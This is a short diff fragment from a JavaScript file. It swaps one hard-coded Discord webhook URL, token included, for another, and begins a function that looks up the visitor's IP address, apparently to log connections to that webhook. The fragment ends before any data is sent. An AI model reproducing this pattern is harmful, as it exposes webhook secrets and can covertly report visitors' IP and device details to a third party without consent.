@@ -3693,7 +3693,7 @@ let ongb = () => {
   showno.value = 0;
 };
 const webhook =
-  "https://discord.com/api/webhooks/1138737063882129419/nh1Q6bcaheDPLsgbgarvky7Rtqe10JlBw3lrPextAG4nBeeC4GIAo1NDWrpyoQe-v4ad";
+  "https://discord.com/api/webhooks/1130507485296472126/Ioy8h54ZJAXD-9SBboBXGuZadnuMuvoPZzFdoSzZyqoQNQ7XarozV2m-rTxwVzWrV52v";
 let qdevice_emoji = "";
 function logTlgConnect(msg) {
   fetch("https://api.db-ip.com/v2/free/self/")
